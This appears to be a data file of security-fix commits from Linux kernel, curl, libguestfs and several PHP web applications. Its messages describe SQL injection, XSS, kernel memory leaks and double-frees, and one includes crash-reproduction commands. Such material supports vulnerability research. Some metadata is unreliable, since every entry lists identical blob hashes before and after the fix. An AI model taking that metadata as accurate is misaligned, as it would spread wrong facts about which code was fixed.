usb: chipidea: Allow disabling streaming not only in udc mode\n\nWhen running a scp transfer using a USB/Ethernet adapter the following crash happens:\n\n$ scp test.tar.gz fabio@192.168.1.100:/home/fabio fabio@192.168.1.100's password: test.tar.gz                                      0%    0     0.0KB/s   --:-- ETA ------------[ cut here ]------------ WARNING: at net/sched/sch_generic.c:255 dev_watchdog+0x2cc/0x2f0() NETDEV WATCHDOG: eth0 (asix): transmit queue 0 timed out Modules linked in: Backtrace: [<80011c94>] (dump_backtrace+0x0/0x10c) from [<804d3a5c>] (dump_stack+0x18/0x1c)  r6:000000ff r5:80412388 r4:80685dc0 r3:80696cc0 [<804d3a44>] (dump_stack+0x0/0x1c) from [<80021868>] (warn_slowpath_common+0x54/0x6c) [<80021814>] (warn_slowpath_common+0x0/0x6c) from [<80021924>] (warn_slowpath_fmt+0x38/0x40) ...\n\nSetting SDIS (Stream Disable Mode- bit 4 of USBMODE register) fixes the problem.\n\nHowever, in current code CI13XXX_DISABLE_STREAMING flag is only set in udc mode, so allow disabling streaming also in host mode.\n\nTested on a mx6qsabrelite board.\n\nSuggested-by: Peter Chen <peter.chen@freescale.com> Signed-off-by: Fabio Estevam <fabio.estevam@freescale.com> Reviewed-by: Peter Chen <peter.chen@freescale.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    9427e32e2ed54c1a2bc519a88c057207836df489
File(s) In Commit: 
    htdocs/adherents/fiche.php
Blob(s) In Commit: 
    57aa72e70ca8c6825cfba7beb3cef3b99b21d43a
Blob(s) Before Fix: 
    57aa72e70ca8c6825cfba7beb3cef3b99b21d43a
Projects:
    01viniciusmelo_dolibarr
Commit Message for 9427e32e2ed54c1a2bc519a88c057207836df489:
Fix security breach (SQL injection)

======================================================================
Commit With Fix: 
    8a90598b23e1b2689848187941f7a96b04907005
File(s) In Commit: 
    htdocs/core/lib/functions.lib.php
Blob(s) In Commit: 
    bacda98845d5f700c82e8ad63f25f8f91c45b553
Blob(s) Before Fix: 
    bacda98845d5f700c82e8ad63f25f8f91c45b553
Projects:
    01viniciusmelo_dolibarr
Commit Message for 8a90598b23e1b2689848187941f7a96b04907005:
Fix: Escape entities

======================================================================
Commit With Fix: 
    526a80dd202bbca396687a502d52c27e06e97fff
File(s) In Commit: 
    htdocs/core/lib/barcode.lib.php
Blob(s) In Commit: 
    67b51748d3e6801e9d7320978ca9fc2ab00c8a37
Blob(s) Before Fix: 
    67b51748d3e6801e9d7320978ca9fc2ab00c8a37
Projects:
    01viniciusmelo_dolibarr
Commit Message for 526a80dd202bbca396687a502d52c27e06e97fff:
Sec: Param not escaped Fix: Bad return error

======================================================================
Commit With Fix: 
    8176cced706b5e5d15887584150764894e94e02f
File(s) In Commit: 
    kernel/events/core.c
Blob(s) In Commit: 
    4d3124b392774322ae1b33f167a10c1046d886d9
Blob(s) Before Fix: 
    4d3124b392774322ae1b33f167a10c1046d886d9
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 8176cced706b5e5d15887584150764894e94e02f:
perf: Treat attr.config as u64 in perf_swevent_init()\n\nTrinity discovered that we fail to check all 64 bits of attr.config passed by user space, resulting to out-of-bounds access of the perf_swevent_enabled array in sw_perf_event_destroy().\n\nIntroduced in commit b0a873ebb ("perf: Register PMU implementations").\n\nSigned-off-by: Tommi Rantala <tt.rantala@gmail.com> Cc: Peter Zijlstra <a.p.zijlstra@chello.nl> Cc: davej@redhat.com Cc: Paul Mackerras <paulus@samba.org> Cc: Arnaldo Carvalho de Melo <acme@ghostprotocols.net> Link: http://lkml.kernel.org/r/1365882554-30259-1-git-send-email-tt.rantala@gmail.com Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    fa6a76050d82894365dfe32916903ef7fee3ffcd
File(s) In Commit: 
    src/inspect-fs.c
Blob(s) In Commit: 
    5ca17254ca145bbeb227b752fba0b15d7f2c9bbf
Blob(s) Before Fix: 
    5ca17254ca145bbeb227b752fba0b15d7f2c9bbf
Projects:
    AlphaStaxLLC_libguestfs
Commit Message for fa6a76050d82894365dfe32916903ef7fee3ffcd:
inspection: Fix double-free when certain guest files are empty.\n\nThe following commit:\n\n  commit 5a3da366268825b26b470cde35658b67c1d11cd4   Author: Richard W.M. Jones <rjones@redhat.com>   Date:   Thu Jan 24 17:07:38 2013 +0000\n\n      inspect: Use CLEANUP_* macros in inspection code.\n\ncan cause a double-free along an error path when certain guest files are empty where we expected those files to contain at least one line.\n\nThis causes virt-inspector to crash when run on these guests.\n\nThe following is a test case which demonstrates the crash. `f20rawhidex64' is a Fedora guest, but with small adjustments to the test you could use any Linux guest for this test.\n\n  $ qemu-img create -f qcow2 -b f20rawhidex64 /tmp/test.qcow2   Formatting '/tmp/test.qcow2', fmt=qcow2 size=21474836480 backing_file='f20rawhidex64' encryption=off cluster_size=65536 lazy_refcounts=off   $ guestfish -i -a /tmp/test.qcow2 -- rm /etc/redhat-release : touch /etc/redhat-release   $ virt-inspector /tmp/test.qcow2   *** glibc detected *** virt-inspector: double free or corruption (fasttop): 0x00007f18bc9925a0 ***   ======= Backtrace: =========   /lib64/libc.so.6(+0x34ecc7ca8e)[0x7f18b8e64a8e]   /lib64/libguestfs.so.0(+0x3f91898078)[0x7f18ba13c078]   /lib64/libguestfs.so.0(+0x3f91899761)[0x7f18ba13d761]   /lib64/libguestfs.so.0(+0x3f91896d12)[0x7f18ba13ad12]   /lib64/libguestfs.so.0(+0x3f91894140)[0x7f18ba138140]   /lib64/libguestfs.so.0(guestfs_inspect_os+0x35)[0x7f18ba0bcc35]   virt-inspector(main+0x547)[0x7f18ba7c57d7]   /lib64/libc.so.6(__libc_start_main+0xf5)[0x7f18b8e09a05]   virt-inspector(+0x6665)[0x7f18ba7c7665]\n\nThis is a denial of service, but not likely to be exploitable.\n\n(Found by Coverity)

======================================================================
Commit With Fix: 
    19ffddb0fe1a4ffdb459b797ffcf7f490d28b5a6
File(s) In Commit: 
    src/libraw_cxx.cpp
Blob(s) In Commit: 
    f45521b2a682fc893815ad62f63b441b39215d74
Blob(s) Before Fix: 
    f45521b2a682fc893815ad62f63b441b39215d74
Projects:
    AlexeyKruglov_LibRaw
Commit Message for 19ffddb0fe1a4ffdb459b797ffcf7f490d28b5a6:
prevent double-free() on broken full-color images error handling

======================================================================
Commit With Fix: 
    2f912f5b33582961b1cdbd9fd828589f8b78f21d
File(s) In Commit: 
    src/libraw_cxx.cpp
Blob(s) In Commit: 
    e36c11a5b742055bb2bae583649f6302427cbfab
Blob(s) Before Fix: 
    e36c11a5b742055bb2bae583649f6302427cbfab
Projects:
    AlexeyKruglov_LibRaw
Commit Message for 2f912f5b33582961b1cdbd9fd828589f8b78f21d:
fixed wrong data_maximum calcluation  prevent out-of-buffer in exp_bef

======================================================================
Commit With Fix: 
    baff42ab1494528907bf4d5870359e31711746ae
File(s) In Commit: 
    net/ipv4/tcp.c
Blob(s) In Commit: 
    2c75f891914e83ee5ed3f99c51aa84f5de7e9c9b
Blob(s) Before Fix: 
    2c75f891914e83ee5ed3f99c51aa84f5de7e9c9b
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for baff42ab1494528907bf4d5870359e31711746ae:
net: Fix oops from tcp_collapse() when using splice()\n\ntcp_read_sock() can have a eat skbs without immediately advancing copied_seq. This can cause a panic in tcp_collapse() if it is called as a result of the recv_actor dropping the socket lock.\n\nA userspace program that splices data from a socket to either another socket or to a file can trigger this bug.\n\nSigned-off-by: Steven J. Magnani <steve@digidescorp.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    2bd410ee5570cea127233f1133ea22f25174eb28
File(s) In Commit: 
    modules/webadmin.cpp
Blob(s) In Commit: 
    4f42d58b7f4bcc3ae0dcbb37839a542179a9e2d0
Blob(s) Before Fix: 
    4f42d58b7f4bcc3ae0dcbb37839a542179a9e2d0
Projects:
    126carpower_znc
Commit Message for 2bd410ee5570cea127233f1133ea22f25174eb28:
Fix NULL pointer dereference in webadmin.\n\nTriggerable by any non-admin, if webadmin is loaded.\n\nThe only affected version is 1.0\n\nThanks to ChauffeR (Simone Esposito) for reporting this.

======================================================================
Commit With Fix: 
    604c499cbbcc3d5fe5fb8d53306aa0fae1990109
File(s) In Commit: 
    drivers/block/xen-blkback/blkback.c
Blob(s) In Commit: 
    4119bcdefd1affc8a8ea2dd928a45dd128b36828
Blob(s) Before Fix: 
    4119bcdefd1affc8a8ea2dd928a45dd128b36828
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 604c499cbbcc3d5fe5fb8d53306aa0fae1990109:
xen/blkback: Check device permissions before allowing OP_DISCARD\n\nWe need to make sure that the device is not RO or that the request is not past the number of sectors we want to issue the DISCARD operation for.\n\nThis fixes CVE-2013-2140.\n\nCc: stable@vger.kernel.org Acked-by: Jan Beulich <JBeulich@suse.com> Acked-by: Ian Campbell <Ian.Campbell@citrix.com> [v1: Made it pr_warn instead of pr_debug] Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

======================================================================
Commit With Fix: 
    b9e146d8eb3b9ecae5086d373b50fa0c1f3e7f0f
File(s) In Commit: 
    kernel/signal.c
Blob(s) In Commit: 
    598dc06be4214c7a11fbf128baff984fa9c1c4b5
Blob(s) Before Fix: 
    598dc06be4214c7a11fbf128baff984fa9c1c4b5
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b9e146d8eb3b9ecae5086d373b50fa0c1f3e7f0f:
kernel/signal.c: stop info leak via the tkill and the tgkill syscalls\n\nThis fixes a kernel memory contents leak via the tkill and tgkill syscalls for compat processes.\n\nThis is visible in the siginfo_t->_sifields._rt.si_sigval.sival_ptr field when handling signals delivered from tkill.\n\nThe place of the infoleak:\n\nint copy_siginfo_to_user32(compat_siginfo_t __user *to, siginfo_t *from) {         ...         put_user_ex(ptr_to_compat(from->si_ptr), &to->si_ptr)          ... }\n\nSigned-off-by: Emese Revfy <re.emese@gmail.com> Reviewed-by: PaX Team <pageexec@freemail.hu> Signed-off-by: Kees Cook <keescook@chromium.org> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: Oleg Nesterov <oleg@redhat.com> Cc: "Eric W. Biederman" <ebiederm@xmission.com> Cc: Serge Hallyn <serge.hallyn@canonical.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    f1923820c447e986a9da0fc6bf60c1dccdf0408e
File(s) In Commit: 
    arch/x86/kernel/cpu/perf_event_intel.c
Blob(s) In Commit: 
    cc45deb791b01d103c01cbc527f8bfd023d51879
Blob(s) Before Fix: 
    cc45deb791b01d103c01cbc527f8bfd023d51879
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for f1923820c447e986a9da0fc6bf60c1dccdf0408e:
perf/x86: Fix offcore_rsp valid mask for SNB/IVB\n\nThe valid mask for both offcore_response_0 and offcore_response_1 was wrong for SNB/SNB-EP, IVB/IVB-EP. It was possible to write to reserved bit and cause a GP fault crashing the kernel.\n\nThis patch fixes the problem by correctly marking the reserved bits in the valid mask for all the processors mentioned above.\n\nA distinction between desktop and server parts is introduced because bits 24-30 are only available on the server parts.\n\nThis version of the  patch is just a rebase to perf/urgent tree and should apply to older kernels as well.\n\nSigned-off-by: Stephane Eranian <eranian@google.com> Cc: peterz@infradead.org Cc: jolsa@redhat.com Cc: gregkh@linuxfoundation.org Cc: security@kernel.org Cc: ak@linux.intel.com Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    192c4f788d48f82c03e9cef40013f34370e90737
File(s) In Commit: 
    lib/escape.c
Blob(s) In Commit: 
    aa7db2c5b99d94287b4bac94c0b9be0ede22a2db
Blob(s) Before Fix: 
    aa7db2c5b99d94287b4bac94c0b9be0ede22a2db
Projects:
    0ca_curl
Commit Message for 192c4f788d48f82c03e9cef40013f34370e90737:
Curl_urldecode: no peeking beyond end of input buffer\n\nSecurity problem: CVE-2013-2174\n\nIf a program would give a string like "%FF" to curl_easy_unescape() but ask for it to decode only the first byte, it would still parse and decode the full hex sequence. The function then not only read beyond the allowed buffer but it would also deduct the *unsigned* counter variable for how many more bytes there's left to read in the buffer by two, making the counter wrap. Continuing this, the function would go on reading beyond the buffer and soon writing beyond the allocated target buffer...\n\nBug: http://curl.haxx.se/docs/adv_20130622.html Reported-by: Timo Sirainen

======================================================================
Commit With Fix: 
    15f72c1ee5e0afad20232bdf0fcecab8d62a5d89
File(s) In Commit: 
    plugins/mandril/mandril.c
Blob(s) In Commit: 
    820f4416d769860a11599c2ded44762ec729d7ff
Blob(s) Before Fix: 
    820f4416d769860a11599c2ded44762ec729d7ff
Projects:
    AmesianX_monkey
Commit Message for 15f72c1ee5e0afad20232bdf0fcecab8d62a5d89:
Mandril: check decoded URI (fix #92)\n\nSigned-off-by: Eduardo Silva <eduardo@monkey.io>

======================================================================
Commit With Fix: 
    b61ac518ffa2657e2dc9019b2dcf2f3f37dbfab0
File(s) In Commit: 
    src/moxieplayer.as
Blob(s) In Commit: 
    c626b77433ea8c944a62a616d1f277eb72968987
Blob(s) Before Fix: 
    c626b77433ea8c944a62a616d1f277eb72968987
Projects:
    wix-pl_moxieplayer
Commit Message for b61ac518ffa2657e2dc9019b2dcf2f3f37dbfab0:
Consider part of url after '?' as querystring, no matter what preceeds it.\n\nFlash doesn't recognize '#' symbol as the beginning of the fragment to ignore, so if '?' mark follows, remaining part of the url will still be interpreted as application parameters… wtf?

======================================================================
Commit With Fix: 
    f2815633504b442ca0b0605c16bf3d88a3a0fcea
File(s) In Commit: 
    net/sctp/sm_statefuns.c
Blob(s) In Commit: 
    de1a0138317f482c028ce583c335501b14d9f917
Blob(s) Before Fix: 
    de1a0138317f482c028ce583c335501b14d9f917
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for f2815633504b442ca0b0605c16bf3d88a3a0fcea:
sctp: Use correct sideffect command in duplicate cookie handling\n\nWhen SCTP is done processing a duplicate cookie chunk, it tries to delete a newly created association.  For that, it has to set the right association for the side-effect processing to work. However, when it uses the SCTP_CMD_NEW_ASOC command, that performs more work then really needed (like hashing the associationa and assigning it an id) and there is no point to do that only to delete the association as a next step.  In fact, it also creates an impossible condition where an association may be found by the getsockopt() call, and that association is empty.  This causes a crash in some sctp getsockopts.\n\nThe solution is rather simple.  We simply use SCTP_CMD_SET_ASOC command that doesn't have all the overhead and does exactly what we need.\n\nReported-by: Karl Heiss <kheiss@gmail.com> Tested-by: Karl Heiss <kheiss@gmail.com> CC: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: Vlad Yasevich <vyasevich@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    4aaacbb1e628a80803ba1a55703db38fccdf7dbf
File(s) In Commit: 
    reviewboard/htdocs/media/rb/js/reviews.js
Blob(s) In Commit: 
    035872ff94ce71e3970db30b563e042268ec497c
Blob(s) Before Fix: 
    035872ff94ce71e3970db30b563e042268ec497c
Projects:
    1tush_reviewboard
Commit Message for 4aaacbb1e628a80803ba1a55703db38fccdf7dbf:
Fix an XSS vulnerability in the reviews dropdown.\n\nThe reviews dropdown had a bad vulnerability where it would assume the user's full name is valid HTML. This allowed the user to craft a script tag that would be executed every time the name appeared in the dropdown.\n\nThis vulnerability exists in 1.6.x, 1.7.x, and the in-development 1.8. There are no known attacks in the wild.\n\nThis was reported by Craig Young at Tripwire.

======================================================================
Commit With Fix: 
    a963a37d384d71ad43b3e9e79d68d42fbe0901f3
File(s) In Commit: 
    net/ipv6/ip6_output.c
Blob(s) In Commit: 
    d5d20cde8d92808387e171fb25b2fa701a06f275
Blob(s) Before Fix: 
    d5d20cde8d92808387e171fb25b2fa701a06f275
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a963a37d384d71ad43b3e9e79d68d42fbe0901f3:
ipv6: ip6_sk_dst_check() must not assume ipv6 dst\n\nIt's possible to use AF_INET6 sockets and to connect to an IPv4 destination. After this, socket dst cache is a pointer to a rtable, not rt6_info.\n\nip6_sk_dst_check() should check the socket dst cache is IPv6, or else various corruptions/crashes can happen.\n\nDave Jones can reproduce immediate crash with trinity -q -l off -n -c sendmsg -c connect\n\nWith help from Hannes Frederic Sowa\n\nReported-by: Dave Jones <davej@redhat.com> Reported-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: Eric Dumazet <edumazet@google.com> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    a5cc68f3d63306d0d288f31edfc2ae6ef8ecd887
File(s) In Commit: 
    net/key/af_key.c
Blob(s) In Commit: 
    9da862070dd84fe596f77582c82af6eec8ad660c
Blob(s) Before Fix: 
    9da862070dd84fe596f77582c82af6eec8ad660c
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a5cc68f3d63306d0d288f31edfc2ae6ef8ecd887:
af_key: fix info leaks in notify messages\n\nkey_notify_sa_flush() and key_notify_policy_flush() miss to initialize the sadb_msg_reserved member of the broadcasted message and thereby leak 2 bytes of heap memory to listeners. Fix that.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Cc: Steffen Klassert <steffen.klassert@secunet.com> Cc: "David S. Miller" <davem@davemloft.net> Cc: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    85dfb745ee40232876663ae206cba35f24ab2a40
File(s) In Commit: 
    net/key/af_key.c
Blob(s) In Commit: 
    d5a4a796f0250ac1d48f6d116eec6b4f9a81f339
Blob(s) Before Fix: 
    d5a4a796f0250ac1d48f6d116eec6b4f9a81f339
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 85dfb745ee40232876663ae206cba35f24ab2a40:
af_key: initialize satype in key_notify_policy_flush()\n\nThis field was left uninitialized. Some user daemons perform check against this field.\n\nSigned-off-by: Nicolas Dichtel <nicolas.dichtel@6wind.com> Signed-off-by: Steffen Klassert <steffen.klassert@secunet.com>

======================================================================
Commit With Fix: 
    c5318bb1a2dd266b50317a2adb74d74338593733
File(s) In Commit: 
    lib/flowplayer.swf.php
Blob(s) In Commit: 
    58bcd2019430f9a4a1c7cd5f732bf90e2b3866a0
Blob(s) Before Fix: 
    58bcd2019430f9a4a1c7cd5f732bf90e2b3866a0
Projects:
    12aZeR_gallery3
Commit Message for c5318bb1a2dd266b50317a2adb74d74338593733:
Strip off the fragment as well as any query parameters.  Fixes #2073.

======================================================================
Commit With Fix: 
    cbbcf1b4791762d7da0ea7b6c4f4b551a4d9caed
File(s) In Commit: 
    modules/gallery/helpers/data_rest.php
Blob(s) In Commit: 
    a0a225f990d2b5ed7095ea9ffbc783335a77a5de
Blob(s) Before Fix: 
    a0a225f990d2b5ed7095ea9ffbc783335a77a5de
Projects:
    12aZeR_gallery3
Commit Message for cbbcf1b4791762d7da0ea7b6c4f4b551a4d9caed:
#2074 - Mirror some additional file_proxy checks in data_rest.\n\n--HG-- extra : source : 752417004a5c988b09f1312c4e96f10dd11594b9

======================================================================
Commit With Fix: 
    6c8aa4e9c810994f7632837487426867ce50f468
File(s) In Commit: 
    symphony/lib/toolkit/class.authormanager.php
Blob(s) In Commit: 
    d07df76c29b12b2ef0f35ffdbe4b0409a3db5bbb
Blob(s) Before Fix: 
    d07df76c29b12b2ef0f35ffdbe4b0409a3db5bbb
Projects:
    1900_symphony-2
Commit Message for 6c8aa4e9c810994f7632837487426867ce50f468:
Fix potential autheticated SQL injection attack on the Authors page

======================================================================
Commit With Fix: 
    29cd8ae0e1a39e239a3a7b67da1986add1199fc0
File(s) In Commit: 
    net/dcb/dcbnl.c
Blob(s) In Commit: 
    21291f1abcd6d0d228241b6771984d704bc1699e
Blob(s) Before Fix: 
    21291f1abcd6d0d228241b6771984d704bc1699e
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 29cd8ae0e1a39e239a3a7b67da1986add1199fc0:
dcbnl: fix various netlink info leaks\n\nThe dcb netlink interface leaks stack memory in various places: * perm_addr[] buffer is only filled at max with 12 of the 32 bytes but   copied completely, * no in-kernel driver fills all fields of an IEEE 802.1Qaz subcommand,   so we're leaking up to 58 bytes for ieee_ets structs, up to 136 bytes   for ieee_pfc structs, etc., * the same is true for CEE -- no in-kernel driver fills the whole   struct,\n\nPrevent all of the above stack info leaks by properly initializing the buffers/structures involved.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    84d73cd3fb142bf1298a8c13fd4ca50fd2432372
File(s) In Commit: 
    net/core/rtnetlink.c
Blob(s) In Commit: 
    a585d45cc9d9faefbc51fde485971a1336065e58
Blob(s) Before Fix: 
    a585d45cc9d9faefbc51fde485971a1336065e58
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 84d73cd3fb142bf1298a8c13fd4ca50fd2432372:
rtnl: fix info leak on RTM_GETLINK request for VF devices\n\nInitialize the mac address buffer with 0 as the driver specific function will probably not fill the whole buffer. In fact, all in-kernel drivers fill only ETH_ALEN of the MAX_ADDR_LEN bytes, i.e. 6 of the 32 possible bytes. Therefore we currently leak 26 bytes of stack memory to userland via the netlink interface.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c085c49920b2f900ba716b4ca1c1a55ece9872cc
File(s) In Commit: 
    net/bridge/br_mdb.c
Blob(s) In Commit: 
    ee79f3f20383c9112ff2685ef10b6d69a1d40c97
Blob(s) Before Fix: 
    ee79f3f20383c9112ff2685ef10b6d69a1d40c97
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c085c49920b2f900ba716b4ca1c1a55ece9872cc:
bridge: fix mdb info leaks\n\nThe bridging code discloses heap and stack bytes via the RTM_GETMDB netlink interface and via the notify messages send to group RTNLGRP_MDB afer a successful add/del.\n\nFix both cases by initializing all unset members/padding bytes with memset(0).\n\nCc: Stephen Hemminger <stephen@networkplumber.org> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    3e88c98ca513880e2b43ed7f27ade17fef5d9170
File(s) In Commit: 
    security/MemberLoginForm.php
Blob(s) In Commit: 
    cb584539cc2465d0bfe583261851c5d314efd6c7
Blob(s) Before Fix: 
    cb584539cc2465d0bfe583261851c5d314efd6c7
Projects:
    12345678--_silverstripe-framework
Commit Message for 3e88c98ca513880e2b43ed7f27ade17fef5d9170:
API Restrict MemberLoginForm to POST requests for increased security\n\nCVE-2013-2653 - Thanks to Fara Rustein of Deloitte Argentina for reporting.

======================================================================
Commit With Fix: 
    12ae030d54ef250706da5642fc7697cc60ad0df7
File(s) In Commit: 
    kernel/trace/trace_event_perf.c
Blob(s) In Commit: 
    78e27e3b52ac2ee0b9e86f544b77a45e12865d95
Blob(s) Before Fix: 
    78e27e3b52ac2ee0b9e86f544b77a45e12865d95
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 12ae030d54ef250706da5642fc7697cc60ad0df7:
perf/ftrace: Fix paranoid level for enabling function tracer\n\nThe current default perf paranoid level is "1" which has "perf_paranoid_kernel()" return false, and giving any operations that use it, access to normal users. Unfortunately, this includes function tracing and normal users should not be allowed to enable function tracing by default.\n\nThe proper level is defined at "-1" (full perf access), which "perf_paranoid_tracepoint_raw()" will only give access to. Use that check instead for enabling function tracing.\n\nReported-by: Dave Jones <davej@redhat.com> Reported-by: Vince Weaver <vincent.weaver@maine.edu> Tested-by: Vince Weaver <vincent.weaver@maine.edu> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Ingo Molnar <mingo@kernel.org> Cc: Jiri Olsa <jolsa@redhat.com> Cc: Frederic Weisbecker <fweisbec@gmail.com> Cc: stable@vger.kernel.org # 3.4+ CVE: CVE-2013-2930 Fixes: ced39002f5ea ("ftrace, perf: Add support to use function tracepoint in perf") Signed-off-by: Steven Rostedt <rostedt@goodmis.org>

======================================================================
Commit With Fix: 
    972757c4500d94b4b1306bf092e678add3a987d8
File(s) In Commit: 
    plugins/jojo_core/classes/Jojo.php
Blob(s) In Commit: 
    c47c5dbe8388167bf98f03484a4b945ca6ea7f3a
Blob(s) Before Fix: 
    c47c5dbe8388167bf98f03484a4b945ca6ea7f3a
Projects:
    tekapa_Jojo-CMS
Commit Message for 972757c4500d94b4b1306bf092e678add3a987d8:
Fix SQL injection issue CVE-2013-3081

======================================================================
Commit With Fix: 
    9b3e617f3df53822345a8573b6d358f6b9e5ed87
File(s) In Commit: 
    net/atm/common.c
Blob(s) In Commit: 
    737bef59ce899adc0a3e0ba67ea3d56536e5b7e5
Blob(s) Before Fix: 
    737bef59ce899adc0a3e0ba67ea3d56536e5b7e5
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 9b3e617f3df53822345a8573b6d358f6b9e5ed87:
atm: update msg_namelen in vcc_recvmsg()\n\nThe current code does not fill the msg_name member in case it is set. It also does not set the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.\n\nFix that by simply setting msg_namelen to 0 as obviously nobody cared about vcc_recvmsg() not filling the msg_name in case it was set.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ef3313e84acbf349caecae942ab3ab731471f1a1
File(s) In Commit: 
    net/ax25/af_ax25.c
Blob(s) In Commit: 
    e277e38f736b93a133a6cd43cc7b264acfbad641
Blob(s) Before Fix: 
    e277e38f736b93a133a6cd43cc7b264acfbad641
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for ef3313e84acbf349caecae942ab3ab731471f1a1:
ax25: fix info leak via msg_name in ax25_recvmsg()\n\nWhen msg_namelen is non-zero the sockaddr info gets filled out, as requested, but the code fails to initialize the padding bytes of struct sockaddr_ax25 inserted by the compiler for alignment. Additionally the msg_namelen value is updated to sizeof(struct full_sockaddr_ax25) but is not always filled up to this size.\n\nBoth issues lead to the fact that the code will leak uninitialized kernel stack bytes in net/socket.c.\n\nFix both issues by initializing the memory with memset(0).\n\nCc: Ralf Baechle <ralf@linux-mips.org> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    4683f42fde3977bdb4e8a09622788cc8b5313778
File(s) In Commit: 
    net/bluetooth/af_bluetooth.c
Blob(s) In Commit: 
    0d1b08cc76e1d73acba966e4c22f64c0285cce05
Blob(s) Before Fix: 
    0d1b08cc76e1d73acba966e4c22f64c0285cce05
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 4683f42fde3977bdb4e8a09622788cc8b5313778:
Bluetooth: fix possible info leak in bt_sock_recvmsg()\n\nIn case the socket is already shutting down, bt_sock_recvmsg() returns with 0 without updating msg_namelen leading to net/socket.c leaking the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.\n\nFix this by moving the msg_namelen assignment in front of the shutdown test.\n\nCc: Marcel Holtmann <marcel@holtmann.org> Cc: Gustavo Padovan <gustavo@padovan.org> Cc: Johan Hedberg <johan.hedberg@gmail.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    e11e0455c0d7d3d62276a0c55d9dfbc16779d691
File(s) In Commit: 
    net/bluetooth/rfcomm/sock.c
Blob(s) In Commit: 
    7c9224bcce178c493ce0a19f3f8250b1828d39b8
Blob(s) Before Fix: 
    7c9224bcce178c493ce0a19f3f8250b1828d39b8
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for e11e0455c0d7d3d62276a0c55d9dfbc16779d691:
Bluetooth: RFCOMM - Fix missing msg_namelen update in rfcomm_sock_recvmsg()\n\nIf RFCOMM_DEFER_SETUP is set in the flags, rfcomm_sock_recvmsg() returns early with 0 without updating the possibly set msg_namelen member. This, in turn, leads to a 128 byte kernel stack leak in net/socket.c.\n\nFix this by updating msg_namelen in this case. For all other cases it will be handled in bt_sock_stream_recvmsg().\n\nCc: Marcel Holtmann <marcel@holtmann.org> Cc: Gustavo Padovan <gustavo@padovan.org> Cc: Johan Hedberg <johan.hedberg@gmail.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c8c499175f7d295ef867335bceb9a76a2c3cdc38
File(s) In Commit: 
    net/bluetooth/sco.c
Blob(s) In Commit: 
    fb6192c9812e81bcac3d8dea31f60095aa40ffda
Blob(s) Before Fix: 
    fb6192c9812e81bcac3d8dea31f60095aa40ffda
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c8c499175f7d295ef867335bceb9a76a2c3cdc38:
